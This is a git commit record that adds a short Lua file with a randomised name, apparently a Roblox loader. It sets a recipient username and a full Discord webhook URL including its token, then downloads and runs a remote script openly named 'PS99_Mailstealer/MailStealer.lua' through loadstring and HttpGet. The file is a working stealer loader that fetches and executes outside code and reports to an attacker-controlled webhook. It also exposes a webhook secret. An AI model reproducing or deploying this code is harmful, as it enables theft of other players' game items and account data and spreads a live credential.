fcdd1cdecad3fef2a2f1bd6c93e48c756ce37822
wRaptorXD <85031494+wRaptorXD@users.noreply.github.com>
2024-07-25 13:22:16 +0200

    Add files via upload

---
+++ obf_sdw3P87di2C6ma50Nn0PTr6CJeGGtUPk80Z6bLnYwGmbuciVXMYFkF34w12vV30d.lua
@@ -0,0 +1,5 @@
+Username = "Lein9xd"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1223288364296568873/lSdfXmSAK_9yjyi8XUXABANyUxAsLfstIYUaWIk1fDXQxlAtX7WClKaelyCLGqFCyiWb"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
